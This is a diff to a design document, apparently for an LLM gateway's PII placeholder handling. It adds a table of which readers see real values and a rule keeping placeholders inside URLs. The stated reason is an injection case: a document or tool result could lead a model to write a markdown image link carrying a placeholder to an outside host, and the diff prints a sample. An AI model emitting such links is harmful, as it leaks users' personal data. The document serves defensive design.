@@ -134,6 +134,20 @@ follows `on_error`.
 
 Placeholders are reversed only where text leaves the backend: the console run stream (live and replay) for the run's own user, the facade's agent path, direct model path (one piece and live stream) and external agent path for the caller. A live stream never splits a placeholder: on the agent path the writer holds a delta's tail that may still open one (`PlaceholderAligner`, at most 15 characters) so every stored stream entry has whole placeholders; on the direct path each choice's content and tool call arguments pass a `StreamDetokenizer`. Nothing is reversed when the policy enforces a `pii` rule on `output.pre`/`output.stream.delta` (the output was checked with the placeholders in it; the kept placeholders are logged as `detokenize_skipped_policy scope=<run or request> count=<n>`, no value), and nothing stored is reversed. Unresolved placeholders stay and are logged (`detokenize_unresolved scope=<run or request> count=<n>`).
 
+Who sees what (C17):
+
+| Who | Sees |
+|---|---|
+| The provider and an external agent (llmaas) | placeholders (egress tokenizes) |
+| The run's own user on the console (live stream, replay) | values |
+| The caller of a facade request (direct model, agent, external agent) | values |
+| Another member reading the run (analyst, admin, approver) | placeholders |
+| Stored views (`GET /runs/{id}`, `GET /runs/{id}/events`, approvals) | placeholders |
+| A placeholder inside a URL or a markdown link/image target (`](…)`, `href=…`, `https://…`), for every reader | placeholder (`detokenize_skipped_url`, count only) |
+| Any reader when the policy enforces a `pii` rule on the output | placeholders (`detokenize_skipped_policy`, count only) |
+
+A URL keeps its placeholder because an upstream (external agent, provider, or an instruction injected through a document or tool result) could write `![x](https://its-host/?q=<<PII_1>>)` and a client that loads images would send the value to that host (KARARLAR "C17 geri çevirme bağlam istisnası"). A URL is the text from `](`, `href=` or `scheme://` to the next whitespace; a stream keeps the text since the last whitespace (at most 8,192 characters) so a URL that began in an earlier chunk is seen. Tool call arguments get the values JSON-escaped. If the token store cannot be read, the console or facade agent stream ends with an `error` event `detokenize_unavailable` (the run goes on; reconnect).
+
 ## PII categories (canonical list)
 
 English, Presidio-compatible codes; the 13a set uses the same list (a test keeps them equal).
